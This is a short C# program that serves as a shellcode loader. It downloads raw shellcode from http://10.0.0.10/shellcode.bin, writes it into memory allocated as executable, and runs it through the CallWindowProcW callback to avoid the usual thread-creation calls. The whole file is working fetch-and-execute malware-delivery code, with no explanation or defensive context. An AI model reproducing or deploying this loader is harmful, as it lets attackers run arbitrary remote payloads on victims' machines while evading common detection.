using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CallWindowProcW
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            CallWindowProcW(addr, IntPtr.Zero, 0, 0, 0);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("user32.dll")]
        static extern UInt32 CallWindowProcW(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, int wParam, int lParam);
    }
}
